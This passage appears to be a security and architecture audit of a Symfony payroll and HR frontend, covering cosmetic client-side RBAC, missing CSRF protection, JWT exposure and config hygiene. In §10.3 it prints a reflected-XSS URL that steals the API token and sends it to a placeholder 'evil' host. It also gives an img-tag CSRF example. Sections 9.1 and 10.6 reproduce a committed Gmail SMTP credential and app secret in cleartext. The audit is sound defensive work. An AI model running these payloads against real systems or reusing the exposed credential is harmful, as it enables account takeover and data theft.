        {% endif %}
    </div>
</div>
```

* No pagination, no "mark as read", no unread counter (the animated `bg-sky-500` ping dot is **always**
  shown, regardless of whether there are notifications).
* Relative-time is computed in Twig with a manual `DateInterval` ladder rather than a filter/extension.
* **The data is always one page-load stale.** `NotificationListener` runs on `kernel.response`, i.e.
  *after* Twig has already rendered the body. So the dropdown on page *N* shows the payload fetched
  during page *N-1*; the fresh payload only becomes visible on the next navigation.
* There is a leftover debug block at the top, commented out:
  `{# <div id="_notification-area">{{ dump(app.session.get('notification_message')) }}</div> #}` —
  this is the `_notification-area` id referenced in the brief.

---

## 6. RBAC on the frontend

The API returns two permission matrices at login/revalidation, stored in the session as
`main_module_access` and `sub_module_access`. Shape (inferred from consumers):

```jsonc
main_module_access = {
  "project":        { "can_view": true, "can_edit": true, "can_add": true, "can_delete": false },
  "humanres":       { ... },
  "administration": { ... }
}
sub_module_access = {
  "daily_time_record": {...}, "subdivision": {...}, "division": {...}, "department": {...},
  "phase": {...}, "owner": {...}, "models": {...}, "model_types": {...}, "emp_settings": {...},
  "shifts": {...}, "projects": {...}, "emp_project": {...}, "emp_list": {...}, "sss_config": {...},
  "pagibig_config": {...}, "bir_config": {...}, "philhealth_config": {...}, "payroll": {...},
  "payroll_reports": {...}, "leave_policy": {...}, "emp_leaves": {...}, "holiday_config": {...},
  "leave_request": {...}, "leave_calendar": {...}
}
```

### 6.1 Gate 1 — Twig, top-level menu (server-side, the only real one)

`templates/partials/_sidebar.html.twig`:

```twig
{% set main_module_access = app.session.get('main_module_access') %}
{% if main_module_access.project is not empty and main_module_access.project.can_view is same as(true) %}
    <li ...>  {# "Project Management" top-level item #}
{% endif %}

{% if main_module_access.humanres.can_view is same as(true) %}
    <li ...>  {# "Human Resource" top-level item #}
{% endif %}
```

plus two hard role checks by code:

```twig
{% if app.session.get('userTypeCode') == 'SADM' %}                                  {# L119, L297 #}
{% if app.session.get('userTypeCode') == 'SADM' or app.session.get('userTypeCode') == 'ADM' %}   {# L221 — "Roles and Access" #}
```

`_topbar.html.twig` shows `app.session.get('fullname')`, `app.session.get('userTypeName')`,
`app.session.get('profile_image_path')` and builds the "My Profile" link from
`app.session.get('empCode')`.

### 6.2 Gate 2 — the body data attributes

`templates/partials/_body.html.twig` (the entire file is one line):

```twig
<body class="…" data-user-permissions="{{ app.session.get('main_module_access')|json_encode }}" data-user-sub-permission="{{ app.session.get('sub_module_access')|json_encode }}">
```

**The complete permission matrix of the logged-in user is serialised into the HTML of every page.**

### 6.3 Gate 3 — `public/assets/js/permission.js` (87 lines) — client-side DOM hiding

```js
document.addEventListener('DOMContentLoaded', function () {
    applyPermissionsToDOM();
});

function applyPermissionsToDOM() {
    var main_permissions = JSON.parse(document.body.getAttribute('data-user-permissions'));
    var sub_permissions  = JSON.parse(document.body.getAttribute('data-user-sub-permission'));

    console.log(sub_permissions);

    function hideOrModifyElements(selector, modifyClass) {
        document.querySelectorAll(selector).forEach(function (element) {
            if (modifyClass) { element.classList.remove(modifyClass); }
            else             { element.style.display = 'none'; }
        });
    }

    function applyPermissions(permissions, moduleName) {
        if (permissions[moduleName]) {
            const canView   = permissions[moduleName].can_view;
            const canEdit   = permissions[moduleName].can_edit;
            const canAdd    = permissions[moduleName].can_add;
            const canDelete = permissions[moduleName].can_delete;

            if (!canView)  { hideOrModifyElements(`.view-${moduleName}`); }
            if (!canEdit)  {
                if (moduleName === 'phase') { hideOrModifyElements(`.edit-${moduleName}`, 'editable-cell'); }
                else                        { hideOrModifyElements(`.edit-${moduleName}`); }
            }
            if (!canAdd)    { hideOrModifyElements(`.add-${moduleName}`); }
            if (!canDelete) { hideOrModifyElements(`.delete-${moduleName}`); }

            if (!canEdit && !canAdd)    { hideOrModifyElements(`.action-${moduleName}`); }
            if (!canEdit && !canDelete) { hideOrModifyElements(`.action-${moduleName}`); }
        }
    }

    if (main_permissions) {
        ['project', 'humanres', 'administration'].forEach(module => applyPermissions(main_permissions, module));
    }

    if (sub_permissions) {
        const subModules = [
            'daily_time_record', 'subdivision', 'division', 'department',
            'phase', 'owner', 'models', 'model_types', 'emp_settings',
            'shifts', 'projects', 'emp_project', 'emp_list','sss_config' ,'pagibig_config',
            'bir_config', 'philhealth_config', 'payroll', 'payroll_reports' ,'leave_policy',
            'emp_leaves', 'holiday_config', 'leave_request', 'leave_calendar',
        ];
        subModules.forEach(subModule => applyPermissions(sub_permissions, subModule));

        // Division specific handling
        if (sub_permissions.division && !sub_permissions.division.can_view) {
            hideOrModifyElements('.division-item');
        }
    }

    console.log('Permissions applied');
}
```

The convention is CSS-class-as-permission-marker: `view-<module>`, `add-<module>`, `edit-<module>`,
`delete-<module>`, `action-<module>`. Typical markup (`templates/administration/division.html.twig`):

```html
<button data-modal-target="addDivisionModal" type="button" class="add-division text-white btn …">Add Division</button>
...
<td class="action-division px-3.5 py-2.5 …">
  <a data-modal-target="editDivisionModal{{division.id}}"  class="edit-division …">Edit</a>
  <a data-modal-target="deleteModal{{division.id}}"        class="delete-division …">Delete</a>
</td>
```

Most-used markers across `templates/` (`grep -rho '\(add\|edit\|delete\|view\|action\)-[a-z_]\{3,\}'`):
`edit-emp_list` ×30, `view-shifts` ×10, `edit-model_types` ×10, `add-employee` ×10,
`view-payroll_reports` ×8, `view-emp_settings` ×7, `add-daily_time_record` ×7, `edit-payroll` ×5,
`edit-daily_time_record` ×5, `action-model_types` ×6 …

### 6.4 Critical RBAC weaknesses

1. **The sidebar's *sub*-menu items are gated only by JS.** In `_sidebar.html.twig` the `<li>`s carry
   `class="view-shifts"` / `class="view-emp_settings"` etc., and are hidden by `permission.js` *after*
   the DOM loads. Disabling JavaScript, or a fast click before `DOMContentLoaded`, exposes them. The
   links themselves work — nothing server-side blocks the route.
2. **`view-shifts` and `view-emp_settings` are used as catch-all markers** (10 and 7 occurrences) for
   entirely unrelated menu entries: Payroll, Payroll Reports, BIR/SSS/Pag-IBIG/PhilHealth Config,
   Holiday Config, Leave Request, Leave Calendar, Overtime Request, Employee Payroll Profile. So a user
   with `shifts.can_view = false` loses access to the whole payroll & leave menu, and a user with
   `shifts.can_view = true` gains it — the granular `payroll`, `payroll_reports`, `bir_config`,
   `sss_config`, `leave_request`, `holiday_config` flags that `permission.js` knows about are
   **never applied to the menu**.
3. **No controller checks permissions.** Not one of the 21 controllers reads `main_module_access` /
   `sub_module_access` or `userTypeCode`. Direct navigation to any route (e.g.
   `/super/user-roles`, `/payroll-reports`, `/employee/profile/{code}`) succeeds for **any authenticated
   user** regardless of role. Enforcement rests entirely on the backend API's own checks.
4. **The full permission matrix is exposed in the page source** and, on the Direct-JS screens, so is the
   JWT — a user can trivially re-enable hidden buttons via DevTools and re-issue the underlying calls.
5. `hideOrModifyElements` uses `style.display = 'none'` — elements remain in the DOM, still submit if
   inside a form, and are still focusable/clickable programmatically.
6. Modules referenced in the sidebar HTML but **missing from the `subModules` array** in `permission.js`
   (`view-category`, `view-list`, `view-project`, `view-humanres`, `view-administration`, `view-salary`)
   are never processed at all.

---

## 7. Form submission patterns

Three patterns coexist. **Symfony Forms (`AbstractType`, `createForm`) are never used** — there is no
`src/Form/` directory, and no `{{ form_start() }}` anywhere. Every field is hand-written HTML and every
value is read with `$request->request->get('...')`.

Counts across `templates/`: **92 `method="post"` forms**, **6 `enctype="multipart/form-data"`**,
**0 occurrences of `csrf_token`** in either `templates/` or `src/`.

### Pattern A — native HTML form POST → Symfony route → API → 302 redirect (the default)

*Template* — `templates/administration/division.html.twig` L107-138 (modal "Add Division"):

```twig
<form action="{{ path('submit_division') }}" method="post">
    <input type="text" id="divisionCode" name="divisionCode" class="form-input …">
    <input type="text" id="divisionName" name="divisionName" class="form-input …">
    <input type="text" id="description"  name="description"  class="form-input …">
    <select … name="divisionHead">
        {% for empItem in employees_list %}
            <option value="{{empItem.id}}">{{empItem.employee_code}} : {{empItem.last_name }}, {{empItem.first_name}}</option>
        {% endfor %}
    </select>
    <button type="button" id="close-modal" data-modal-close="addDivisionModal" class="… reset-form …">Cancel</button>
    <button type="submit" class="…">Add Division</button>
</form>
```

*Controller* — `src/Controller/AdministrationController.php` L82-128:

```php
#[Route('/form/submit_division', name: 'submit_division')]
public function submitSubdivisionForm(Request $request, HttpClientInterface $httpClient)
{
    $session = $request->getSession();
    $token = $session->get('token');
    if ($request->isMethod('POST')) {
        try {
            $formData = [
                'code'        => $request->request->get('divisionCode'),
                'name'        => $request->request->get('divisionName'),
                'description' => $request->request->get('description'),
                'director_id' => $request->request->get('divisionHead'),
            ];
            $response = $this->apiService->apiRequest('POST', 'api/division/create', json_encode($formData), $token);
            if(is_array($response)){
                if (isset($response['error']) && $response['error'] === true) {
                    $errorMessage = 'Error: Status code ' . $response['status'];
                    $responseMessage = json_decode($response['message'], true)['message'] ?? $errorMessage;
                    return $this->redirectToRoute('division', [
                        'status'  => $response['status'],
                        'error'   => $errorMessage,
                        'message' => $responseMessage,
                    ]);
                }
            }
            return $this->redirectToRoute('division',[
                'status'  => $response->getStatusCode(),
                'error'   => '',
                'message' => '',
            ]);
        } catch (\Throwable $e) {
            $this->addFlash('status', 'failed');
            return $this->redirectToRoute('division', [
                'status'  => 'failed',
                'error'   => 'An error occurred while processing your request.',
                'message' => $e->getMessage(),
            ]);
        }
    }
    $this->addFlash('status', 'failed');
    return $this->redirectToRoute('division');
}
```

Characteristics of Pattern A (used by ~85 routes):

* `methods:` is declared on only **22 of ~110 routes** (`HolidayController` ×6, `LeavePolicyController`
  ×3, `PagibigConfigController` ×3, `EmployeeLeavesController` ×2, `LeaveRequestController` ×2,
  `ManpowerController` ×2, `ProjectManagementController` ×2, `BIRConfigController` ×1,
  `SSSConfigController` ×1). Everywhere else the route accepts any verb and relies (at best) on an
  inner `if ($request->isMethod('POST'))`. 25 write routes have neither — see §10.4.
* No CSRF token, no validation, no `Assert` constraints. Every field goes straight to the API.
* Outcome is communicated by **query parameters on the redirect**, consumed by `AlertListener` (§5.2).
* Some routes *also* `addFlash('status','failed')`, consumed by an inline Twig block (§7.4) — two
  parallel notification channels for the same operation.
* `HttpClientInterface $httpClient` is injected into many of these actions and never used.

### Pattern B — jQuery `$.ajax` → Symfony JSON route → API (11 call sites)

*Template* — `templates/project_management/apps-project.html.twig` L966-995:

```js
$.ajax({
    url: '{{ path("assign_workers_to_projects") }}', // Symfony route
    type: 'POST',
    data: formData,
    beforeSend: function () {
        $('#addNew').prop('disabled', true).text('Submitting...');
    },
    success: function (response) {
        console.log('Response:', response);
        if (response.status === 'success') {
            showToast(response.message, 'bg-green-500'); // Show success toast
        } else {
            showToast('Something went wrong!', 'bg-red-500'); // Show error toast
        }
    },
    ...
});
```

*Controller* — `ProjectManagementController::assignWorkersToProjectsWithTask()` (L932-1013) validates,
builds the payload, `POST api/project/assign-workers`, and returns `new JsonResponse([...])`.

The Symfony JSON endpoints that exist purely to serve `$.ajax`:
`update_blocks`, `select_subdivision_profile`, `assign_workers_to_projects`,
`update_selected_project_workers`, `app_emp_project_json`, `upload_profile_picture`,
`generate_payroll_report` (error branch only).

### Pattern C — jQuery `$.ajax` **straight to the REST API**, bypassing Symfony (40 call sites)

*Template* — `templates/manpower/apps-manpower.html.twig` L1203-1222:

```js
async function updateAttendanceStatus(itemId, selectedValue) {
    const selectedWorkerId = $('#workerIdParams').data('worker-id');
    try {
        const apiUrl = `api/worker-overtime/update_attendance/${itemId}`;
        const requestData = { attendance_id: selectedValue };
        console.log('attendace updated')
        const response = await apiCall('POST', apiUrl, requestData);

        $('#dateWorker').trigger('change');
        console.log('Attendance status updated successfully:', response);
    } catch (error) {
        console.error('Error updating attendance status:', error);
    }
}
```

Here the browser sends the JWT itself to `http://127.0.0.1:8000/api/...`. Symfony is not involved at
all — so no server-side logging, no session revalidation, no `AlertListener`, and the API must have
permissive CORS for the frontend origin.

### 7.4 Notifications, alerts & toasts

**Toast library: Toastify-JS only.** `templates/partials/_vendor-scripts.html.twig`:

```twig
<!-- jQuery -->
<script src="{{ asset('assets/js/jquery/jquery-3.7.1.min.js') }}"></script>
<!-- Toastr -->
<script src="{{ asset('assets/libs/toastify-js/src/toastify.js') }}"></script>
<!-- Flatpickr -->
<script src="{{ asset('assets/libs/flatpickr/flatpickr.min.js') }}"></script>
<script src="{{ asset('assets/js/api.js') }}"></script>
<script src="{{ asset('assets/js/permission.js') }}"></script>
<script src="{{ asset('assets/js/global_functions.js') }}"></script>
```

`showToast()` is defined in `api.js` (L45-61) and is the single toast entry-point:

```js
function showToast(message, className) {
    Toastify({
        newWindow: true, text: message, gravity: 'top', position: 'right',
        className: className, stopOnFocus: true,
        offset: { x: 0, y: 0 }, duration: 3000, close: true,
    }).showToast();
}
```

**SweetAlert2 is loaded but essentially unused.** `assets/libs/sweetalert2/` is vendored and the script
tag appears in 5 real templates (`administration/user_settings.html.twig`,
`employee_payroll_profile/employees-payroll-profile.html.twig`, `manpower/apps-employees.html.twig`,
`manpower/apps-manpower.html.twig`, `apps-hr-employee.html.twig`) plus two theme demo pages
(`plugins-sweetalert.html.twig`, `tables-listjs.html.twig`). **`grep -rn "Swal\." templates` returns
zero matches** — no `Swal.fire()` call exists anywhere. The only `Swal` reference in PHP is inside
`HomeController::renderErrorPageWithToast()` (L444-467), a private method that is **never called** and
whose heredoc even loads Toastify from a CDN and then uses `Swal.mixin`:

```php
$toastScript = <<<SCRIPT
<script type='text/javascript' src='https://cdn.jsdelivr.net/npm/toastify-js'></script>
<script>
    const Toast = Swal.mixin({ toast: true, position: 'top-end', showConfirmButton: false, timer: 3000 });
    Toast.fire({ type: 'error', title: 'Incorrect username or password' });
</script>
SCRIPT;
```

There are therefore **four** distinct, overlapping ways a message reaches the user:

| # | Channel | Producer | Consumer |
|---|---|---|---|
| 1 | Query-string → injected `<script>` | `AlertListener` on `kernel.response`, fed by `redirectToRoute(..., ['status','message'])` | `showToast()` |
| 2 | `javascriptSnippet` Twig variable | Controllers build a literal `"<script>showToast('…','bg-green-500')</script>"` string (`HomeController` L59-62, L279-320; `EmployeeProfileController`) and pass it to `render()` | `{{ javascriptSnippet|raw }}` in the template |
| 3 | Symfony flash bag | `$this->addFlash('status','failed'|'success')` in 12 places | `{% for flash_message in app.flashes('status') %}<div class="hidden" id="status" data-status="{{ flash_message }}"></div>{% endfor %}` + a page-local `$(document).ready` that reads `$('#status').data('status')` and calls `Toastify({...})` **inline, duplicated per template** |
| 4 | AJAX response body | `JsonResponse(['status'=>'success','message'=>…])` | `showToast(response.message, 'bg-green-500')` in the `$.ajax` success handler |

Channel 3's per-template duplication (`templates/administration/division.html.twig` L217-280) is
copy-pasted into ~20 templates with only the wording changed:

```twig
{% for flash_message in app.flashes('status') %}
    <div class="hidden" id="status" data-status="{{ flash_message }}"></div>
{% endfor %}
```
```js
$(document).ready(function () {
    const status = $('#status');
    if (status.length) {
        if (status.data('status') == 'success') {
            Toastify({ text: 'Division added successfully', className: "bg-green-500", … }).showToast();
        } else {
            Toastify({ text: 'Division not added, something went wrong.', className: "bg-red-500", … }).showToast();
        }
    }
})
```

Because `AdministrationController::submitSubdivisionForm()` only ever calls
`addFlash('status', 'failed')` (never `'success'`), Channel 3 on the Division page can only ever show
the red toast; the green path is dead. Meanwhile Channel 1 independently shows
*"Action completed successfully."* for the same request. Users can see **both toasts at once**.

---

## 8. Server-side rendering data flow

### 8.1 The layout chain

```
partials/base.html.twig
 ├── partials/_main.html.twig        (<!DOCTYPE html><html … data-layout="horizontal" …>)
 ├── <head> … {% block stylesheets %} … partials/_head-css.html.twig
 ├── partials/_body.html.twig        (<body … data-user-permissions=… data-user-sub-permission=…>)
 ├── {% block body %}
 │    ├── partials/_menu.html.twig ──┬── partials/_topbar.html.twig ── partials/_notification-area.html.twig
 │    │                              └── partials/_sidebar.html.twig
 │    ├── #page-loader / #content-wrapper
 │    ├── partials/_page-wrapper.html.twig  (── partials/_page-title.html.twig)
 │    ├── {% block content %}  ← the page
 │    ├── partials/_footer.html.twig
 │    ├── partials/_customizer.html.twig
 │    └── partials/_vendor-scripts.html.twig  +  {% block javascripts %}
 └── {{ errorScript|default('')|raw }}   ← after </body>, never populated
```

`partials/without-nav.html.twig` is the alternative shell used by the auth screens
(`auth-login-boxed.html.twig` extends it).

Breadcrumbs are a Symfony UX Twig Component:
`{{ component('breadcrumb', { pagetitle: 'Division', title: 'Division' }) }}` →
`src/Components/Breadcrumb.php` + `templates/components/Breadcrumb.html.twig`.

### 8.2 The controller → Twig contract

There is **no view model, no DTO, no serializer**. Controllers pass raw decoded JSON sub-arrays and
Twig indexes into them with dot notation (`{{ division.director.name }}`,
`{{ empItem.employee_code }}`). If the API changes a key, Twig fails at render time (or silently
renders nothing, since `strict_variables` is only enabled `when@test` in `config/packages/twig.yaml`).

Naming is inconsistent across the app — `snake_case`, `camelCase` and `PascalCase` all appear:

| Controller | Twig variables passed |
|---|---|
| `HomeController::viewDashboard` | `divisions, departments, projects, employees, subdivisions, owners, models, dtr_count, manpower_count, javascriptSnippet` |
| `AdministrationController::viewDivision` | `controller_name, divisions, employees_list` |
| `AdministrationController::viewDepartment` | `controller_name, departments, divisions` |
| `AdministrationController::viewModels` | `controller_name, models, model_types` |
| `AdministrationController::viewShifts` | `shiftList` |
| `ManpowerController::viewEmployees` | `employees, currentPage, limit, totalPages, totalEmployees, provinces, townCities, divisions, affiliated_companies` |
| `EmployeeProfileController::viewProfile` | `controller_name, worker_id, employee_code, employeeData, provinces, townCities, divisions, employeeAdditionalRecord, employeeAttachment, javascriptSnippet, projects, payrollProfile, leaveEntitlements, leaveHistory, leave_entitlements, leave_request, employee_id, leave_policies, emp_overtime_request, accountability_records` |
| `EmployeePayrollController::viewEmployeePayroll` | `emp_list_payroll, salary_totals, payroll_groups, selectedYear` |
| `PayrollReportsController::viewPhilHealthConfig` | `companyList` |
| `LeaveRequestController::viewLeaveRequests` | `leaveRequests, leave_policies, employees` |
| `LeaveRequestController::viewLeaveCalendar` | `leaveRequests` (hardcoded `[]`), `holidays`, `employeeLeaves` |
| `PayrollController::viewEmployeePayroll` | `subdivisions` |

Recurring idioms:

* `'controller_name' => 'XController'` — MakerBundle scaffolding left in ~15 renders, unused by Twig.
* `?? []` defaulting so a failed API call renders an empty table rather than an error
  (`'emp_list_payroll' => $empPayrolls['emp_list'] ?? []`).
* Duplicate/conflicting variables for the same data (`leaveEntitlements` = `[]` **and**
  `leave_entitlements` = real data).
* Two full render branches per action (200 vs. non-200) with copy-pasted argument lists.
* `javascriptSnippet` — a raw `<script>` string built in PHP and echoed with `|raw`.

---

## 9. Configuration reference

### 9.1 `.env` (committed, 2119 bytes) — full contents of the non-comment lines

```dotenv
###> symfony/framework-bundle ###
APP_ENV=dev
APP_DEBUG=1
APP_SECRET=9f5a5e4aba4cd66e32b318844f3c3ae3
###< symfony/framework-bundle ###

###> doctrine/doctrine-bundle ###
DATABASE_URL="postgresql://app:!ChangeMe!@127.0.0.1:5432/app?serverVersion=15&charset=utf8"
###< doctrine/doctrine-bundle ###

###> symfony/messenger ###
MESSENGER_TRANSPORT_DSN=doctrine://default?auto_setup=0
###< symfony/messenger ###

###> symfony/mailer ###
# MAILER_DSN=null://null
MAILER_DSN=smtp://japarece@techrostrum.com:zhtlkdfcbnykqzfs@smtp.gmail.com:587?encryption=tls
###< symfony/mailer ###
```

* **There is no API base-URL variable.** (`grep -i "api" .env` → nothing.)
* `APP_ENV=dev` / `APP_DEBUG=1` are the committed defaults; there is no `.env.prod`, and `.gitignore`
  only ignores `.env.local*`. `.gitlab-ci.yml` excludes `.env` from the deploy zip, so production values
  must be maintained by hand on each server.
* `DATABASE_URL` and `MESSENGER_TRANSPORT_DSN` point at Doctrine, but **`config/bundles.php` does not
  register `DoctrineBundle`** and `src/Entity/` and `src/Repository/` are empty directories.
  `composer.json` nevertheless requires `doctrine/dbal ^3`, `doctrine/doctrine-bundle ^2.12`,
  `doctrine/orm ^3.2` and `doctrine/doctrine-migrations-bundle ^3.3`, and a `migrations/` directory
  exists. All dead weight.
* `MAILER_DSN` contains a **live Gmail SMTP username and app password in cleartext, committed to git**.

### 9.2 `config/bundles.php`

```php
return [
    Symfony\Bundle\FrameworkBundle\FrameworkBundle::class => ['all' => true],
    Symfony\Bundle\DebugBundle\DebugBundle::class => ['dev' => true],
    Symfony\Bundle\TwigBundle\TwigBundle::class => ['all' => true],
    Symfony\Bundle\WebProfilerBundle\WebProfilerBundle::class => ['dev' => true, 'test' => true],
    Symfony\Bundle\MakerBundle\MakerBundle::class => ['dev' => true],
    Symfony\WebpackEncoreBundle\WebpackEncoreBundle::class => ['all' => true],
    Symfony\UX\TwigComponent\TwigComponentBundle::class => ['all' => true],
    Symfony\Bundle\SecurityBundle\SecurityBundle::class => ['all' => true],
];
```

### 9.3 `config/services.yaml` (the only non-default wiring)

```yaml
parameters:
    uploads_directory: '%kernel.project_dir%/public/uploads'

services:
    _defaults: { autowire: true, autoconfigure: true }
    App\:
        resource: '../src/'
        exclude: ['../src/DependencyInjection/', '../src/Entity/', '../src/Kernel.php']

    App\EventListener\SessionListener:
        arguments: { $requestStack: '@request_stack', $logger: '@logger', $router: '@router' }
        tags: [{ name: kernel.event_listener, event: kernel.request, method: onKernelRequest }]

    app.my_custom_redis_provider:
        class: \Redis
        factory: ['Symfony\Component\Cache\Adapter\RedisAdapter', 'createConnection']
        arguments: ['redis://localhost', { retry_interval: 2, timeout: 10 }]

    App\EventListener\AlertListener:
        tags: [{ name: kernel.event_listener, event: kernel.response, method: onKernelResponse }]

    App\EventListener\NotificationListener:
        class: App\EventListener\NotificationListener
        arguments:
            $requestStack: '@request_stack'
            $twig: '@twig'
            $apiService: '@App\Service\APIRequest'
            $apiFunctions: '@App\Service\APIFunctions'
        tags: [{ name: kernel.event_listener, event: kernel.response, method: onKernelResponse }]
```

`redis://localhost` is hardcoded (no `REDIS_URL` env var). Consumed via
`#[Autowire(service: 'cache.my_redis')] AdapterInterface $cache` in `HomeController` (injected, never
used) and `EmployeeProfileController` (used).

### 9.4 Other config files

| File | Notable content |
|---|---|
| `config/packages/framework.yaml` | `secret: '%env(APP_SECRET)%'`, **`#csrf_protection: true` (commented)**, `http_method_override: false`, `handle_all_throwables: true`, native file sessions, `cookie_secure: auto`, `cookie_samesite: lax` |
| `config/packages/twig.yaml` | `default_path: '%kernel.project_dir%/templates'`; `strict_variables: true` **only `when@test`** |
| `config/packages/security.yaml` | see §4.1 — inert |
| `config/packages/routing.yaml` | `utf8: true`; `strict_requirements: null` in prod |
| `config/packages/cache.yaml` | one pool `cache.my_redis` on `app.my_custom_redis_provider`; the default `app` cache stays on the filesystem |
| `config/packages/mailer.yaml` | `dsn: '%env(MAILER_DSN)%'` |
| `config/packages/messenger.yaml` | `async` transport on `MESSENGER_TRANSPORT_DSN`, `failed: 'doctrine://default?queue_name=failed'` — Doctrine bundle is not installed, so this is broken-but-unused |
| `config/packages/web_profiler.yaml` | toolbar + profiler enabled `when@dev` |
| `config/packages/webpack_encore.yaml` | `output_path: public/build`; `json_manifest_path` commented out |
| `config/routes.yaml` | `resource: ../src/Controller/`, `type: attribute` |
| `config/routes/security.yaml` | `_security_logout: { resource: security.route_loader.logout, type: service }` |
| `config/routes/framework.yaml`, `web_profiler.yaml` | dev-only error/profiler routes |

### 9.5 `public/index.php` (9 lines — stock Symfony 7 runtime)

```php
<?php

use App\Kernel;

require_once dirname(__DIR__).'/vendor/autoload_runtime.php';

return function (array $context) {
    return new Kernel($context['APP_ENV'], (bool) $context['APP_DEBUG']);
};
```

`App\Kernel` is the stock `MicroKernelTrait` kernel. **In the analysed working copy, `src/Kernel.php`
is deleted and an untracked duplicate sits at `templates/Kernel.php`:**

```
$ git status --porcelain | grep -i kernel
 D src/Kernel.php
?? templates/Kernel.php
```

Since `composer.json` maps `"App\\": "src/"`, `App\Kernel` is unresolvable from `templates/` and this
checkout **cannot boot**. The file is correct in git history; this is a local working-tree accident,
but it is symptomatic of the repo's hygiene (there are 60+ files showing as modified, and stray build
artefacts are committed).

### 9.6 Stray artefacts in `public/`

```
public/
├── Manpower_Monitoring_Report_20241004.xlsx
├── Manpower_Monitoring_Report_20241006.xlsx
├── Manpower_Monitoring_Report_20241016.xlsx
├── Manpower_Monitoring_Report_20241017.xlsx
├── assets/
├── index.php
└── uploads/
    ├── EMP002/
    └── EMP0092/
```

Four generated payroll/manpower reports are sitting in the **web root**, publicly downloadable with no
authentication, alongside employee 201-file attachments under `public/uploads/{empCode}/`.
There is also an `uploads/sss table.csv` at the project root.

---

## 10. Weak spots & risks

Ordered roughly by severity.

### 10.1 The JWT is handed to JavaScript (Critical)

`GET /validate_call` returns the raw bearer token as JSON to any authenticated page:

```php
return $this->json(['token' => $token], JsonResponse::HTTP_OK);
```

Consequences:

* The token is readable by **any** script running on the page (third-party libs, injected content) and
  by any XSS payload — see §10.3, which gives a working reflected XSS on every route.
* It nullifies the `HttpOnly` protection of the session cookie: an attacker who cannot read `PHPSESSID`
  can just `fetch('/validate_call')` and get a first-class API credential.
* `api.js` then caches it in a module-global `cachedToken` for the page lifetime, with no expiry check
  and no invalidation on 401.
* The endpoint has no CSRF/Origin/Referer check. Combined with a permissive CORS policy on the API (which
  must exist for Pattern C to work at all), the blast radius is large.

### 10.2 Token stored in plaintext in a file-backed PHP session (High)

`$session->set('token', $data['token'])` with `storage_factory_id: session.storage.factory.native` and
`handler_id: null` → the JWT is written verbatim into `/tmp/sess_*` (or the configured `save_path`) on
the frontend server. Anything with local read access — another vhost, a log shipper, a backup — harvests
every live API credential. Redis is already a dependency and is **not** used for session storage.
There is also no encryption, no `session.cookie_lifetime`, and no server-side token revocation on logout.

### 10.3 Reflected XSS via `AlertListener` (High)

```php
$message = $request->query->get('message') ?? '';
$escapedMessage = json_encode($message);
$errorScript = "<script>showToast({$escapedMessage}, 'bg-red-500');</script>";
$content = str_replace('</body>', $errorScript . '</body>', $content);
```

`json_encode()` escapes quotes and backslashes but **not** `<` or `/`. A URL such as
`/?status=400&message=</script><script>fetch('/validate_call').then(r=>r.json()).then(d=>fetch('//evil/'+d.token))</script>`
terminates the inline script and executes attacker code on **any** route, because the listener runs on
every response. Chained with §10.1 this is a full account/API takeover from a single link.
(`JSON_HEX_TAG` or proper escaping would fix it; better still, don't build scripts in PHP.)

### 10.4 No CSRF protection anywhere (High)

* `framework.yaml`: `#csrf_protection: true` is commented out.
* `grep -rn "csrf_token" templates src` → **0 matches**. 92 `method="post"` forms, zero tokens.
* Symfony Forms are not used, so there is no implicit protection either.
* Most write routes do not declare `methods: ['POST']`. `AdministrationController` at least wraps every
  write in `if ($request->isMethod('POST'))`, but **25 write-performing routes have neither a
  `methods:` restriction nor an `isMethod()` guard**, so they execute their `POST`/`PUT`/`PATCH`/`DELETE`
  API call on a bare `GET`:

  ```
  BIRConfigController              /delete-bir/config                        DELETE
  EmployeePayrollProfileController /employee/payroll/profile/delete/{id}     DELETE
  EmployeeProfileController        /delete/attachment/{employee_code}/{id}   POST
  EmployeeProfileController        /profile-create-leave                     POST
  EmployeeProfileController        /profile-update-overtime-request          PUT
  EmployeeProfileController        /profile-create-overtime-request          POST
  EmployeeProfileController        /accountability-record-create             POST
  EmployeeProfileController        /update-accountability-record             PUT
  HomeController                   /validate_login                           POST
  HomeController                   /revalidate-session                       POST
  HomeController                   /email_forget_password                    POST
  HomeController                   /reset_password/{token}                   POST
  HomeController                   /form/submit/reset_password               POST
  ManpowerController               form/submit_employee                      POST
  ManpowerController               form/update/employee                      PUT
  ManpowerController               /form/submit_task                         POST
  ManpowerController               /form/submit-dtr-task                     POST
  ManpowerController               /form/archive-employee-project            DELETE
  ManpowerController               /form/add-employee                        POST
  ManpowerController               /form/unassign-employee                   POST
  ManpowerController               /manpower/export_xls                      POST
  OvertimeRequestController        /profile-update-overtime-request          PUT
  OvertimeRequestController        /profile-update-overtime-request-status   PUT
  PhilHealthConfigController       /delete-philhealth/config                 DELETE
  SSSConfigController              /delete-sss/config                        DELETE
  ```

  `/form/archive-employee-project?emp_proj_id=5` in an `<img src>` is a one-click destructive CSRF.
* `SameSite=lax` on the session cookie blocks cross-site `POST`, but *not* cross-site top-level `GET`
  navigation — which is exactly what the 25 unguarded routes accept.

### 10.5 No server-side authorization (High)

Neither Symfony `access_control` (all commented out) nor any controller code checks the user's role or
permission matrix. `AuthorizationCheck` is dead code (§5.1). Any authenticated user can `GET`
`/super/user-roles`, `/payroll-reports`, `/administration/user-settings`, `/employee/profile/{anyCode}`,
and POST to any `/form/...` endpoint. The **only** enforcement is (a) JS hiding buttons and (b) whatever
the backend API does — which means the frontend's entire RBAC layer is cosmetic.

### 10.6 Hardcoded base URLs and secrets in source (High)

| Where | Value |
|---|---|
| `src/Service/APIRequest.php:20` | `private $baseURL = "http://127.0.0.1:8000/";` (+2 commented prod/staging URLs) |
| `public/assets/js/api.js:6` | `const baseURL = "http://127.0.0.1:8000/";` (+2 commented) |
| `public/assets/js/api.js:64` | `const baseURL = "http://127.0.0.1:8001/";` (frontend origin, for `/validate_call`) |
| `src/Controller/PayrollController.php:48` | `'http://127.0.0.1:8000/api/subdivision'` inline |
| `config/services.yaml` | `redis://localhost` |
| `.env` | `MAILER_DSN=smtp://japarece@techrostrum.com:zhtlkdfcbnykqzfs@smtp.gmail.com:587` — **live credential in git** |
| `.env` | `APP_SECRET=9f5a5e4aba4cd66e32b318844f3c3ae3` — committed |
| `src/Service/EmailService.php:27` | `->from('noreply@example.com')` |

`.gitlab-ci.yml` institutionalises the problem by excluding `api.js` and `APIRequest.php` from the
deployment archive so hand-edited server copies survive — meaning **the deployed code differs from the
repository by design** and there is no way to know which base URL a given server is using without SSH.
Rotating the Gmail password requires editing a committed file.

### 10.7 Duplicated API logic — PHP vs JS vs PHP (High, maintainability)

